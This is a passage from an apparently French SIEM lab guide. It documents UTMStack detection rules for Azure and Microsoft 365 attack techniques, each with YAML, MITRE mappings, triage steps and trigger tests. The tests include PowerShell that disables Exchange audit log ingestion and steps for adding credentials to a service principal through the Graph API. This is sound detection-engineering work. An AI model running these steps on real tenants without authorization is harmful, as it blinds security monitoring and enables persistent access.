Une attribution de rôle Azure a été créée ou supprimée sur un abonnement ou un groupe de ressources. Cette opération modifie directement les droits d'accès aux ressources Azure : c'est un vecteur classique d'escalade de privilèges et de persistance, par exemple en s'attribuant le rôle Owner sur un abonnement après avoir compromis un premier compte.

**Particularité du champ auteur :** `origin.user` n'est pas mappé pour les events Azure Role Assignment. L'UPN de l'auteur se trouve dans `log.identity.claims` (champ imbriqué non filtrable par le moteur). Pour identifier l'auteur lors d'une investigation, consulter `log.identity.authorization.evidence.role` (rôle de l'auteur) et `origin.ip`. Le champ `log.properties.responseBody` contient le détail complet de l'attribution : rôle attribué, `principalId` et `principalType` de la cible.

**Technique MITRE :** T1078.004 · Valid Accounts: Cloud Accounts

```yaml
name: Azure - Role Assignment Created or Deleted
dataTypes:
  - azure
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Privilege Escalation
technique: T1078.004 - Valid Accounts Cloud Accounts
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1078/004/
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/overview
description: 'Une attribution de rôle Azure a été créée ou supprimée sur l''abonnement ou un resource group. Cette opération modifie les droits d''accès aux ressources Azure et constitue un vecteur classique d''escalade de privilèges et de persistance dans Azure. Next Steps: 1. Identifier le resource group ou la subscription ciblés via event.resourceId. 2. Identifier l''acteur via origin.ip et event.azureActor. 3. Vérifier si le rôle attribué est Owner ou Contributor, particulièrement sensibles. 4. Confirmer si l''opération était planifiée et autorisée. 5. Vérifier si d''autres opérations suspectes ont suivi (DEPLOYMENTS/WRITE, LOCKS/DELETE).'
where: |-
  regexMatch("event.azureKind", "(?i)^(activity|eventgrid)$") &&
  regexMatch("event.azureOperation", "(?i)^Microsoft\\.Authorization/roleAssignments/(write|delete)$") &&
  equalsIgnoreCase("actionResult", "success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → groupe de ressources `tests-events-utmstack` → Contrôle d'accès (IAM) → Ajouter une attribution de rôle → rôle Lecteur → utilisateur de test → Attribuer, puis retirer. Deux alertes déclenchent : `ROLEASSIGNMENTS/WRITE` et `ROLEASSIGNMENTS/DELETE`.

---

### A8 : Diagnostic Settings Created or Modified

> ℹ️ **v11.3.0 :** renommée (anciennement « Modified or Deleted »). La suppression d'un paramètre de diagnostic est couverte par une règle native ; A8 ne garde que la création et la modification.

Un paramètre de diagnostic Azure a été créé, modifié ou supprimé. Les paramètres de diagnostic contrôlent l'envoi des logs vers Log Analytics, Event Hub ou Storage Account. Leur suppression peut aveugler le SIEM en interrompant la collecte des logs Azure Activity.

**Observation importante :** le rôle minimum requis est **Log Analytics Contributor**, pas Owner. Un attaquant avec des droits apparemment limités peut compromettre la visibilité SOC complète.

**Technique MITRE :** T1562.008 · Impair Defenses: Disable Cloud Logs

```yaml
name: Azure - Diagnostic Settings Created or Modified
dataTypes:
  - azure
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Defense Evasion
technique: T1562.008 - Impair Defenses Disable Cloud Logs
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1562/008/
  - https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/diagnostic-settings
description: 'Un paramètre de diagnostic Azure a été créé ou modifié. La suppression est couverte par la règle native UTMStack "Azure Diagnostic Settings Deletion". Les paramètres de diagnostic contrôlent l''envoi des logs de ressources vers Log Analytics, Event Hub ou Storage Account. La suppression ou la modification d''un paramètre existant peut aveugler le SIEM en interrompant la collecte des logs Azure Activity, technique documentée dans les attaques de type "defense evasion" avant destruction d''infrastructure. Next Steps: 1. Identifier la ressource ciblée via event.resourceId, noter si c''est un paramètre de diagnostic sur la subscription entière (impact maximal) ou sur une ressource isolée. 2. Identifier l''acteur via origin.ip. 3. Vérifier si l''opération était planifiée et autorisée. 4. Contrôler si d''autres opérations suspectes ont suivi (ROLEASSIGNMENTS/WRITE, LOCKS/DELETE, RESOURCEGROUPS/DELETE). 5. Restaurer le paramètre de diagnostic si supprimé de manière non autorisée.'
where: |-
  regexMatch("event.azureKind", "(?i)^(activity|eventgrid)$") &&
  regexMatch("event.azureOperation", "(?i)^Microsoft\\.Insights/diagnosticSettings/write$") &&
  equalsIgnoreCase("actionResult", "success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → ressource existante → Paramètres de diagnostic → Ajouter → `allLogs` → Diffuser vers Event Hub `utmstack-azure` → Enregistrer, puis supprimer. Deux alertes déclenchent.

---

### A9 : Key Vault Deleted

> ℹ️ **v11.3.0 :** renommée (anciennement « Created or Deleted »). La création d'un Key Vault est couverte par une règle native ; A9 ne garde que la suppression.

Un coffre de clés Azure (Key Vault) a été créé ou supprimé. Les Key Vaults contiennent les secrets les plus sensibles d'une infrastructure cloud : chaînes de connexion, clés API, certificats. La suppression d'un Key Vault efface l'ensemble de ces secrets en une seule opération.

**Limitation documentée :** les accès aux secrets individuels transitent par les logs de diagnostic Key Vault (`AuditEvent`) et non par l'Activity Log : le connecteur UTMStack v11 ne parse pas ces logs de diagnostic. Cette règle couvre uniquement les opérations sur le coffre lui-même. En cas de suppression, vérifier immédiatement l'état soft-delete via le portail Azure.

**Technique MITRE :** T1485 · Data Destruction

```yaml
name: Azure - Key Vault Deleted
dataTypes:
  - azure
impact:
  confidentiality: 3
  integrity: 3
  availability: 3
category: Impact
technique: T1485 - Data Destruction
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1485/
  - https://learn.microsoft.com/en-us/azure/key-vault/general/logging
description: 'Un coffre de clés Azure (Key Vault) a été supprimé. La création et la modification sont couvertes par la règle native UTMStack "Azure Key Vault Configuration Changed". Les Key Vaults contiennent les secrets les plus sensibles d''une infrastructure cloud, connection strings, clés API, certificats de service. La suppression d''un Key Vault efface l''ensemble de ces secrets en une seule opération et constitue un acte destructeur majeur. Note : les accès aux secrets individuels (lecture, écriture, suppression de secrets) transitent par les logs de diagnostic Key Vault (AuditEvent) et ne sont pas visibles dans l''Activity Log, cette règle couvre uniquement les opérations sur le coffre lui-même. Next Steps: 1. Identifier le Key Vault concerné via event.resourceId. 2. Identifier l''acteur via origin.ip et event.azureActor. 3. Vérifier immédiatement si le Key Vault est en état de suppression réversible (soft-delete) et initier une restauration si nécessaire. 4. Corréler avec d''autres opérations suspectes (ROLEASSIGNMENTS/WRITE, DIAGNOSTICSETTINGS/DELETE).'
where: |-
  regexMatch("event.azureKind", "(?i)^(activity|eventgrid)$") &&
  regexMatch("event.azureOperation", "(?i)^Microsoft\\.KeyVault/vaults/delete$") &&
  equalsIgnoreCase("actionResult", "success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → Key Vaults → Créer dans `tests-events-utmstack` → Créer. Puis supprimer le coffre. Deux alertes déclenchent : création (`resultType = Accept`) et suppression (`resultType = Success`). La création via le portail déclenche également A6 (ARM Deployment implicite).

---

### A10 : Resource Lock Deleted or Modified

Un verrou de ressource Azure (Resource Lock) a été supprimé ou modifié. Les locks `CanNotDelete` ou `ReadOnly` protègent les ressources critiques contre la suppression malveillante.

**Contexte d'attaque :** supprimer un verrou est l'étape préalable logique à la destruction de ressources protégées. La corrélation entre A10 et A2/A3/A11 dans une courte fenêtre temporelle constitue un indicateur fort d'intention malveillante.

**Technique MITRE :** T1562 · Impair Defenses

```yaml
name: Azure - Resource Lock Deleted or Modified
dataTypes:
  - azure
impact:
  confidentiality: 2
  integrity: 3
  availability: 3
category: Defense Evasion
technique: T1562 - Impair Defenses
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1562/
  - https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/lock-resources
description: 'Un verrou de ressource Azure (Resource Lock) a été supprimé ou modifié. Les locks de type CanNotDelete ou ReadOnly protègent les ressources critiques contre la suppression ou la modification accidentelle ou malveillante. Supprimer un lock est l''étape préalable logique à la destruction de ressources protégées. Toute suppression de lock doit être corrélée avec les opérations qui suivent immédiatement (RESOURCEGROUPS/DELETE, VIRTUALMACHINES/DELETE, STORAGEACCOUNTS/DELETE). Next Steps: 1. Identifier la ressource protégée via event.resourceId. 2. Identifier l''acteur via origin.ip et event.azureActor. 3. Vérifier immédiatement si des opérations destructrices ont suivi sur la même ressource. 4. Confirmer si l''opération était planifiée et autorisée. 5. Restaurer le lock si supprimé de manière non autorisée.'
where: |-
  regexMatch("event.azureKind", "(?i)^(activity|eventgrid)$") &&
  regexMatch("event.azureOperation", "(?i)^Microsoft\\.Authorization/locks/(write|delete)$") &&
  equalsIgnoreCase("actionResult", "success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → groupe de ressources `tests-events-utmstack` → Verrous → Ajouter → nom `test-lock` → type `CanNotDelete` → OK. Puis supprimer le verrou. Deux alertes déclenchent.

---

### A11 : Deletion Attempt Blocked by Resource Lock

> ⚠️ **v11.3.0 : non migrée.** Le YAML ci-dessous est la version v11.2 (`log.*`) : il ne se déclenchera pas en v11.3.0. Il sera réécrit lors de la session de validation Azure, une fois les champs d'un échec `ScopeLocked` relevés sur un événement réel.

Une tentative de suppression d'une ressource Azure a été bloquée par un verrou. Le champ `log.properties.statusMessage` contenant `ScopeLocked` est le discriminant précis qui distingue ce blocage d'autres conflits Azure.

Ce signal est particulièrement significatif corrélé avec A10 : la séquence `LOCKS/DELETE → DELETE/Failure/ScopeLocked → LOCKS/DELETE → DELETE/Success` est le pattern exact d'un attaquant contournant méthodiquement les protections. La détection conjointe de A10 et A11 dans une fenêtre courte est un signal d'urgence.

**Technique MITRE :** T1485 · Data Destruction

```yaml
name: Azure - Deletion Attempt Blocked by Resource Lock
dataTypes:
  - azure
impact:
  confidentiality: 1
  integrity: 3
  availability: 3
category: Impact
technique: T1485 - Data Destruction
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1485/
  - https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/lock-resources
description: 'Une tentative de suppression d''une ressource Azure a été bloquée par un verrou de ressource (Resource Lock). Le statusCode Conflict indique que la ressource est protégée par un lock CanNotDelete. Ce signal est particulièrement significatif lorsqu''il est corrélé avec une suppression de lock (A10) dans les minutes qui précèdent ou qui suivent, la séquence LOCKS/DELETE puis DELETE/Failure puis LOCKS/DELETE puis DELETE/Success est le pattern typique d''un attaquant qui cherche à contourner les protections avant de détruire l''infrastructure. Next Steps: 1. Identifier la ressource ciblée via log.resourceId. 2. Identifier l''acteur via origin.ip et log.identity.claims dans le payload brut. 3. Vérifier immédiatement si un lock a été supprimé sur cette ressource (chercher A10 sur le même resourceId). 4. Vérifier si une nouvelle tentative de suppression a réussi après la suppression du lock. 5. Si le lock est toujours en place, le maintenir et investiguer le compte source.'
where: |-
  contains("log.operationName", "DELETE") &&
  contains("log.resultType", "Failure") &&
  contains("log.resultSignature", "Conflict") &&
  contains("log.properties.statusMessage", "ScopeLocked")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** créer un verrou `CanNotDelete` sur une VM ou un groupe de ressources, puis tenter de la supprimer via le portail Azure. L'event `DELETE` avec `resultType = Failure`, `resultSignature = Failed.Conflict` et `statusMessage` contenant `ScopeLocked` est généré dans l'Activity Log.

---

### M8 : Unified Audit Log Ingestion Disabled

La commande PowerShell Exchange Online `Set-AdminAuditLogConfig` a été exécutée sur le tenant. Cette commande permet de désactiver l'ingestion du journal d'audit unifié, aveuglant immédiatement le SIEM. Toute exécution mérite une investigation, quelle que soit la valeur : un administrateur légitime n'exécute cette commande que très rarement.

**Pourquoi ne pas filtrer sur la valeur `False` ?** Le champ `event.Parameters` est un tableau d'objets imbriqués non filtrable par le moteur UTMStack v11.

**Comportement asymétrique documenté :** l'event de désactivation apparaît avec l'IP WAN réelle de la session PowerShell, tandis que l'event de réactivation provient d'une IPv6 Microsoft interne : Exchange Online gère la réactivation depuis ses propres serveurs.

**Faux positif connu :** le service `NT SERVICE\MSExchangeAdminApiNetCore` peut générer cet event lors de maintenances automatiques : non exclu volontairement, car un ServicePrincipal compromis génère le même signal.

**Technique MITRE :** T1562.008 · Impair Defenses: Disable Cloud Logs

✅ **Statut v11.3.0 :** validée par un test scripté. La règle se déclenche sur **toute** exécution de `Set-AdminAuditLogConfig`, même si elle ne change rien : le test peut donc se faire sans couper l'audit. La règle native « Exchange Admin Configuration Changes » se déclenche aussi.

```yaml
name: O365 - Unified Audit Log Ingestion Disabled
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Defense Evasion
technique: T1562.008 - Impair Defenses Disable Cloud Logs
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1562/008/
  - https://learn.microsoft.com/en-us/powershell/module/exchange/set-adminauditlogconfig
description: 'La commande Set-AdminAuditLogConfig a été exécutée sur le tenant Exchange Online. Cette commande permet de désactiver l''ingestion du journal d''audit unifié (UnifiedAuditLogIngestionEnabled), ce qui aveugle le SIEM en supprimant la collecte de tous les events O365. Toute exécution de cette commande est suspecte indépendamment du résultat, un attaquant ayant compromis un compte admin ou un ServicePrincipal Exchange peut l''utiliser pour effacer ses traces. Next Steps: 1. Identifier l''acteur via origin.user et origin.ip. 2. Vérifier si origin.user est un compte humain ou un ServicePrincipal non-Microsoft. 3. Contrôler event.Parameters pour identifier si l''audit a été désactivé (UnifiedAuditLogIngestionEnabled = False). 4. Vérifier l''état actuel de l''audit dans le portail Purview (Audit → Paramètres). 5. Réactiver immédiatement si désactivé et investiguer le vecteur d''accès.'
where: |-
  equals("action", "Set-AdminAuditLogConfig") &&
  contains("event.Workload", "Exchange")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** se connecter à Exchange Online PowerShell (`Connect-ExchangeOnline -UserPrincipalName admin@lan.local`) puis exécuter :

```powershell
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $false
Start-Sleep -Seconds 10
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $true
Disconnect-ExchangeOnline -Confirm:$false
```

Deux alertes déclenchent. La valeur de `UnifiedAuditLogIngestionEnabled` est visible dans `event.Parameters`.

---

### M11 : DLP Rule Match (Purview Data Loss Prevention)

> 🗄️ **Retirée en v11.3.0.** Entièrement incluse dans « Purview DLP - Sensitive Data Policy Match », elle-même retirée au profit de la règle native 806. Le fichier reste disponible dans [`rules/retirees/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/retirees) pour les environnements où cette règle native n'existe pas.

Une politique de prévention contre la perte de données Microsoft Purview a détecté et bloqué le partage de données sensibles.

**Contexte de la politique DLP dans ce lab :** `DLP-Protection-nLPD-demo` est configurée pour détecter les données personnelles au sens de la nLPD (nouvelle Loi fédérale sur la Protection des Données, en vigueur en Suisse depuis septembre 2023), numéros AVS, IBAN suisses, données médicales RH, sur les workloads Exchange, SharePoint et Teams en mode Enforce. La configuration complète est documentée dans le guide [Configuration Microsoft Purview 2026](https://doit4everyone.github.io/microsoft-purview-configuration-2026-nLPD/).

**Pourquoi couvrir les deux casses ?** Le payload O365 peut indexer l'action en `DLPRuleMatch` ou `DlpRuleMatch` selon le workload source. Un filtre `equals()` strict raterait l'une des deux formes : `regexMatch` avec le flag `(?i)` couvre les deux.

**Voir section "La boucle DLP"** : sans correction de l'adresse de notification UTMStack vers une adresse interne, chaque alerte M11 peut générer une nouvelle alerte M11 en boucle.

**Technique MITRE :** T1567 · Exfiltration Over Web Service

```yaml
name: Purview - DLP Rule Match Detected
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Data Loss Prevention
technique: T1567 - Exfiltration Over Web Service
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1567/
  - https://learn.microsoft.com/en-us/purview/dlp-learn-about-dlp
description: 'Une politique DLP Microsoft Purview a détecté et bloqué le partage de données sensibles (DLPRuleMatch / DlpRuleMatch). La casse variable est couverte par regexMatch. Next Steps: 1. Identifier la politique via event.PolicyName. 2. Identifier les données sensibles via event.SensitiveInfoDetectionIsIncluded. 3. Vérifier l''expéditeur via origin.user. 4. Confirmer si le partage était intentionnel. 5. Escalader si destinataire externe et données classifiées.'
where: |-
  regexMatch("action", "(?i)dlprulematch") &&
  contains("event.Workload", "Exchange")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** envoyer depuis `demo@lan.local` vers une adresse externe un email contenant des numéros AVS couverts par `DLP-Protection-nLPD-demo`. L'alerte contient `event.PolicyName`, `event.RuleName` et `event.ExchangeMetaData`.

---

### M12 : Exchange External Mailbox Access

Un accès externe à une boîte aux lettres Exchange Online a été détecté. L'event `MailItemsAccessed` avec `event.ExternalAccess = true` indique qu'un compte ou une application externe au tenant a accédé aux emails d'un utilisateur. **Midnight Blizzard (APT29)** a utilisé ce vecteur pour exfiltrer les emails de cibles diplomatiques via des applications OAuth malveillantes en 2023-2024.

**Validation dans ce lab :** aucun event `MailItemsAccessed` avec `ExternalAccess = true` n'est présent en base : la règle est validée logiquement et déclenchera dès qu'un accès externe effectif se produira.

**Technique MITRE :** T1114.002 · Email Collection: Remote Email Collection

⚠️ **Statut v11.3.0 :** non testable. Les seuls événements `ExternalAccess = true` des 90 derniers jours sont des opérations internes de Microsoft ; le champ désigne un accès par un tiers extérieur à l'organisation, impossible à provoquer dans le lab.

```yaml
name: Exchange - External or Admin Access to Mailbox Detected
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Collection
technique: T1114.002 - Email Collection Remote Email Collection
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1114/002/
  - https://learn.microsoft.com/en-us/purview/audit-mailitemsaccessed
description: 'Un accès externe à une boîte Exchange a été détecté via les events MailItemsAccessed (RecordType 50). Deux patterns sont couverts : accès par délégation depuis une application tierce (LogonType 1) ou accès administrateur à la boîte d''un autre utilisateur (LogonType 2). Ces patterns peuvent indiquer une règle de redirection externe, un accès post-compromission via un token OAuth, ou un abus de droits administrateur. Next Steps: 1. Identifier l''application accédant à la boîte via event.AppId. 2. Vérifier si event.ExternalAccess est true (accès depuis hors organisation). 3. Identifier la boîte cible via event.MailboxOwnerUPN. 4. Contrôler les emails accédés dans les folders listés. 5. Vérifier si des règles inbox ont été créées depuis cet accès (action InboxRuleCreated).'
where: |-
  equals("action", "MailItemsAccessed") &&
  contains("event.Workload", "Exchange") &&
  equals("event.ExternalAccess", true)
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** accéder à la boîte aux lettres d'un utilisateur depuis un compte externe au tenant via l'API Graph ou EWS avec des droits délégués. Dans ce lab, la règle est validée logiquement : aucun accès externe effectif n'a été généré.

---

### M13 : Téléchargement massif SharePoint (non implémentable : investigation documentée)

La règle M13 visait à détecter un volume anormal de téléchargements depuis SharePoint Online : signal d'une exfiltration en préparation d'un chiffrement par ransomware. Après une investigation approfondie, cette règle ne peut pas être implémentée dans UTMStack v11 en l'état.

**Investigation menée :** des téléchargements effectifs ont été réalisés depuis l'interface web SharePoint depuis deux postes distincts (avec et sans OneDrive Sync). Ni `FileDownloaded` ni `FileAccessed` (RecordType 6) n'ont été indexés par UTMStack malgré la souscription `Audit.SharePoint` active et la collecte confirmée des blobs (un `SignInEvent` du même blob est présent dans l'index, preuve que la collecte fonctionne).

**Cause identifiée :** les events de type opération de fichier (RecordType 6) sont perdus après la collecte au stade ETL ou parsing : limitation du pipeline ETL d'UTMStack v11, non liée à Microsoft ni à la configuration tenant.

**À vérifier après chaque mise à jour d'UTMStack :** tester si `FileDownloaded` avec `Workload = SharePoint` apparaît dans `v11-log-o365-*`. Si oui, la règle devient immédiatement implémentable.

Pour la détection d'exfiltration SharePoint, les solutions appropriées sont **Microsoft Purview Insider Risk Management** et **DSPM**, documentées dans le guide [Configuration Microsoft Purview 2026](https://doit4everyone.github.io/microsoft-purview-configuration-2026-nLPD/).

---

### M14 : Sign-In Blocked by Conditional Access Policy

Une tentative de connexion a été bloquée par une politique d'Accès Conditionnel Entra ID. Dans ce lab, la politique `CA-M14-SignIn-Outside-Hours-ReportOnly` bloque les connexions en dehors des heures ouvrables : lundi au vendredi de 07h00 à 19h00 CEST, week-end entier bloqué.

**Note sur la portée :** M14 alerte sur **tout** blocage CA : politique temporelle, conformité des appareils, pays bloqués, authentification héritée. Une seule règle couvre l'ensemble des blocages CA.

**Configuration de la CA temporelle via Graph API :** la condition temporelle n'est pas disponible dans l'interface graphique Entra ID : elle se configure via Microsoft Graph API (Entra ID P1 inclus dans Business Premium). Procédure :

1. Créer la politique CA dans le portail Entra ID (mode Rapport uniquement, Bloquer l'accès, **exclure impérativement le compte break-glass**)
2. Récupérer l'ID via `GET https://graph.microsoft.com/beta/identity/conditionalAccess/policies`
3. Ajouter la condition via `PATCH` sur l'endpoint beta (UTC uniquement : 05h00-17h00 UTC = 07h00-19h00 CEST en été) :

```json
{
  "conditions": {
    "times": {
      "includeAllTimes": true,
      "excludeDays": {
        "daysOfWeek": ["monday","tuesday","wednesday","thursday","friday"],
        "timeZone": "UTC",
        "startTime": "05:00:00",
        "endTime": "17:00:00",
        "allDay": false
      }
    }
  }
}
```

**Note nLPD :** une politique CA temporelle doit être documentée dans le registre des activités de traitement comme contrôle d'accès système (et non évaluation des employés), communiquée aux utilisateurs dans la politique de sécurité IT, et appliquée de manière proportionnée au risque identifié.

**Lacune documentée :** `ConditionalAccessStatus` des Sign-in logs Entra ID n'est pas collecté par le connecteur O365 d'UTMStack. La règle M14 contourne cette limitation via `event.LogonError = BlockedByConditionalAccess`, présent dans les events `Audit.AzureActiveDirectory` collectés.

**Technique MITRE :** T1078.004 · Valid Accounts: Cloud Accounts

✅ **Statut v11.3.0 :** validée par un test scripté (stratégie de blocage ciblant un seul compte de test, `ErrorNumber 53003`).

```yaml
name: O365 - Sign-In Blocked by Conditional Access Policy
dataTypes:
  - o365
impact:
  confidentiality: 2
  integrity: 2
  availability: 1
category: Initial Access
technique: T1078.004 - Valid Accounts Cloud Accounts
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1078/004/
  - https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview
description: 'Une tentative de connexion a été bloquée par une politique d''Accès Conditionnel Entra ID (ErrorNumber 53003, LogonError BlockedByConditionalAccess). Dans ce lab, la politique CA-M14-SignIn-Outside-Hours-ReportOnly bloque les connexions en dehors des heures ouvrables (lundi-vendredi 07h00-19h00 CEST) et le week-end entier. Une connexion bloquée hors heures peut indiquer une tentative d''accès par un attaquant ayant compromis des credentials valides, ou un accès non autorisé depuis un fuseau horaire inhabituel. Note nLPD : cette règle s''appuie sur une politique CA temporelle dont le déploiement doit être documenté dans le registre des activités de traitement comme contrôle d''accès système, et communiqué aux utilisateurs dans la politique de sécurité IT. Next Steps: 1. Identifier le compte bloqué via origin.user. 2. Identifier l''IP source via origin.ip et la géolocalisation. 3. Vérifier si la connexion était légitime (employé en déplacement, décalage horaire) ou suspecte (pays inhabituel, IP de datacenter). 4. Corréler avec d''autres events du même compte (UserLoginFailed, MFA prompts) dans les 24h précédentes. 5. Si suspect, forcer la réinitialisation du mot de passe et révoquer les sessions actives.'
where: |-
  equals("action", "UserLoginFailed") &&
  equals("event.LogonError", "BlockedByConditionalAccess")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** créer la politique CA, ajouter la condition temporelle via Graph API (procédure ci-dessus), passer en mode Activé. Se connecter depuis un compte non exclu en dehors des heures autorisées. L'alerte contient `event.LogonError = BlockedByConditionalAccess`, `event.ErrorNumber = 53003`, et le compte bloqué dans `origin.user`.

---

### M-new-1 : Privileged Role Assigned in Entra ID

> 🗄️ **Retirée en v11.3.0.** Couverte par la règle native 1440 de la v11.3.0. Le fichier reste disponible dans [`rules/retirees/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/retirees) pour les environnements où cette règle native n'existe pas.

Un compte utilisateur a été assigné à un rôle Entra ID. Contrairement à M6 qui couvre les groupes, cette règle cible les rôles d'administration Entra ID : Global Administrator, Security Administrator, Privileged Role Administrator, etc. Dans un scénario post-compromission (AiTM, CVE-2026-69836), l'attribution d'un rôle privilégié est le vecteur de persistance le plus critique : il confère des droits d'administration permanents indépendamment de toute rotation de mot de passe utilisateur.

Le nom du rôle attribué est visible dans `event.ModifiedProperties` (champ `Role.DisplayName`) : non filtrable par le moteur UTMStack mais lisible dans l'alerte pour l'investigation.

**Technique MITRE :** T1098.003 · Account Manipulation: Additional Cloud Roles

```yaml
name: Entra ID - Privileged Role Assigned
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Privilege Escalation
technique: T1098.003 - Account Manipulation Additional Cloud Roles
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1098/003/
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs
description: 'Un compte utilisateur a été assigné à un rôle Entra ID (Add member to role., Workload AzureActiveDirectory). Contrairement à M6 qui couvre les groupes, cette règle cible les rôles d''administration Entra ID, Global Administrator, Security Administrator, Privileged Role Administrator, etc. Dans un scénario post-CVE-2026-69836 ou post-compromission AiTM, l''attribution d''un rôle privilégié est le vecteur de persistance le plus critique. Le nom du rôle attribué est visible dans event.ModifiedProperties (Role.DisplayName). Les attributions automatiques par ServicePrincipals Microsoft sont exclues. Next Steps: 1. Identifier le compte assigné via event.ObjectId. 2. Identifier le rôle attribué via event.ModifiedProperties (Role.DisplayName). 3. Vérifier si origin.user est autorisé à attribuer ce rôle. 4. Retirer l''attribution si non autorisée via Entra ID → Rôles et administrateurs. 5. Révoquer toutes les sessions actives du compte assigné si compromission suspectée.'
where: |-
  equals("action", "Add member to role.") &&
  contains("event.Workload", "AzureActiveDirectory") &&
  !contains("origin.user", "ServicePrincipal_")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Discriminant M6 vs M-new-1 :** M6 filtre sur `Add member to group.` (groupes Entra ID), M-new-1 sur `Add member to role.` (rôles d'administration). Les deux actions coexistent dans les logs O365 avec des libellés distincts.

**Test de déclenchement :** dans le portail Entra ID → Rôles et administrateurs → sélectionner un rôle (ex : Lecteur de sécurité) → Ajouter des attributions → sélectionner un compte de test. L'alerte contient `event.ObjectId` (UPN du compte assigné) et `event.ModifiedProperties` avec `Role.DisplayName` (nom du rôle attribué). Validé en live le 22 août 2026 sur ce lab.

---

### M-new-2 : Credentials Added to Existing Service Principal

> 🗄️ **Retirée en v11.3.0.** Couverte par la règle native 840 de la v11.3.0, qui détecte aussi les secrets ajoutés depuis le portail (que M-new-2 ne voyait pas). Le fichier reste disponible dans [`rules/retirees/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/retirees) pour les environnements où cette règle native n'existe pas.

Un secret ou certificat a été ajouté sur un service principal Entra ID existant. Vecteur de persistance documenté dans les incidents post-compromission d'infrastructure d'identité : un attaquant ayant obtenu un accès temporaire ajoute ses propres credentials sur un service principal disposant déjà de droits étendus, pour maintenir un accès persistant même après réinitialisation des mots de passe utilisateurs.

Ce vecteur figure dans l'audit rétrospectif recommandé après CVE-2026-69836 (voir l'annexe AiTM du bundle MVC) : les credentials ajoutés sur un service principal permettent une authentification application directe, sans MFA, sans Conditional Access, et survivent à toute rotation de mot de passe humain.

**Technique MITRE :** T1098.001 · Account Manipulation: Additional Cloud Credentials

```yaml
name: Entra ID - Credentials Added to Service Principal
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Persistence
technique: T1098.001 - Account Manipulation Additional Cloud Credentials
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1098/001/
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs
description: 'Un secret ou certificat a été ajouté sur un service principal Entra ID existant (Add service principal credentials., Workload AzureActiveDirectory). Vecteur de persistance classique, à auditer après CVE-2026-69836 : un attaquant ayant obtenu un accès temporaire ajoute ses propres credentials sur un service principal existant pour maintenir un accès persistant même après réinitialisation des mots de passe utilisateur. Le service principal concerné est visible dans event.ObjectId. Attention : cette règle couvre uniquement les ajouts via API Graph (addPassword), l''interface graphique Entra ID génère un libellé différent (Update application, Certificates and secrets management) et ne déclenche pas cette règle. Validée en live le 22 août 2026. Next Steps: 1. Identifier le service principal concerné via event.ObjectId. 2. Vérifier l''acteur via origin.user, un acteur inconnu ou un ServicePrincipal non Microsoft est suspect. 3. Auditer les permissions du service principal concerné. 4. Supprimer les credentials non autorisés via Entra ID → Applications d''entreprise → Certificats et secrets. 5. Investiguer les connexions effectuées via ce service principal depuis l''ajout des credentials.'
where: |-
  equals("action", "Add service principal credentials.") &&
  contains("event.Workload", "AzureActiveDirectory")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Note de validation :** validée en live le 22 août 2026 via API Graph (`addPassword`) sur le service principal `Portals-Docs divers`. Latence O365 → UTMStack : ~4 minutes. Champs confirmés : `action = "Add service principal credentials."` (filtre YAML exact), `event.ObjectId` (URI du service principal ciblé), `event.ModifiedProperties` avec `KeyDescription` (nom du credential ajouté visible), `origin.user` (acteur), `event.Target` (nom de l'application ciblée).

**Point critique : deux libellés distincts selon le vecteur d'ajout :**
- Via **API Graph** (`addPassword`) → génère `Add service principal credentials.` → **déclenche M-new-2** ✅
- Via **portail Entra ID** (Applications d'entreprise → Certificats et secrets → Nouveau secret) → génère `Update application – Certificates and secrets management` → **ne déclenche pas M-new-2**

Un attaquant sophistiqué utilise l'API Graph directement pour ajouter ses credentials : c'est précisément ce vecteur que M-new-2 couvre. L'interface graphique génère un libellé différent hors du scope de cette règle.

**Test de déclenchement :** via Graph Explorer (`https://developer.microsoft.com/en-us/graph/graph-explorer`) :

```
# Étape 1, Trouver le servicePrincipal ID de l'app à tester
GET https://graph.microsoft.com/v1.0/servicePrincipals?$filter=appId eq '{appId}'&$select=id,displayName

# Étape 2, Ajouter un credential temporaire
